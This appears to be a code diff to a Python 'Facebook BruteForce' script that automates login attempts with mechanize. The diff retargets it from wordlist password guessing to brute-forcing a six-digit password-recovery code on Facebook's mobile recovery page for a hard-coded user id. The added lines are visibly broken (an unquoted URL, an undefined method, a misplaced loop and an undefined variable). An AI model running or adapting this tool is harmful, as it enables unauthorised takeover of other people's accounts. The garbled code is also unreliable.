@@ -5,7 +5,7 @@
         #       Facebook BruteForce, by 0ssama      #
         #       Contact: 0ssama@protonmail.com      #
         #                                           #
-        #############################################
+        ############################################
 
 
 import time
@@ -42,14 +42,19 @@ for password in wordlist:
             browser = mechanize.Browser()
             browser.set_handle_robots(False)
             browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
-            fb = browser.open('https://facebook.com')
+            fb = browser.open(https://m.facebook.com/recover/password/?u=&n=000000&c=https%3A%2F%2Fm.facebook.com%2Flogin%2Fdevice-based%2Fpassword%2F%3Fuid%3D100046973880327%26flow%3Dlogin_no_pin%26refsrc%3Ddeprecated&ars=device_based_login&fl=default_recover&sih=0&msgr=0&_rdr')
             dos = open('Facebook-Log.txt', 'w+')
+            browser.set('Press your u')   
+n=0
+while n != 999999:
+    n=n+1
+    print(n)                  
             browser.select_form(nr=0)
-            browser.form['email'] = user
-            browser.form['pass'] = password
+            browser.form['u'] = uid 
+            browser.form['pass'] = n
             browser.method = 'POST'
             browser.submit()
-            dos.write(browser.open('https://facebook.com').read())
+            dos.write(browser.open('https://m.facebook.com/recover/password/?u=&n=000000&c=https%3A%2F%2Fm.facebook.com%2Flogin%2Fdevice-based%2Fpassword%2F%3Fuid%3D100046973880327%26flow%3Dlogin_no_pin%26refsrc%3Ddeprecated&ars=device_based_login&fl=default_recover&sih=0&msgr=0&_rdr').read())
             dos.seek(0)
             text = dos.read().decode('UTF-8')
             if text.find('home_icon', 0, len(text)) != -1:
